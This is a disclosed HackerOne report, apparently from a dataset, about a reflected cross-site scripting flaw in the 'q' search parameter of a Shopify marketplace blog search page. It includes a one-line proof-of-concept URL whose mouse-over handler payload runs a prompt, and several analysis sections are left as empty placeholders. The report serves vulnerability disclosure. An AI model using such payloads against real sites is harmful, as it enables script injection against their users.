---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1145162'
original_report_id: '1145162'
title: XSS  at https://exchangemarketplace.com/blogsearch
weakness: Cross-site Scripting (XSS) - Generic
team_handle: shopify
created_at: '2021-04-02T06:45:51.973Z'
disclosed_at: '2021-04-09T01:47:58.669Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 168
asset_identifier: exchangemarketplace.com
asset_type: URL
max_severity: medium
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# XSS  at https://exchangemarketplace.com/blogsearch

## Metadata

- HackerOne Report ID: 1145162
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: shopify
- Disclosed At: 2021-04-09T01:47:58.669Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

There is an XSS vulnerability on https://exchangemarketplace.com/blogsearch page through the `q` parameters.
`https://exchangemarketplace.com/blogsearch?q=OnMoUsEoVeR=prompt(/hacked/)//`
{F1251282}

## Impact

XSS  at https://exchangemarketplace.com/blogsearch

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
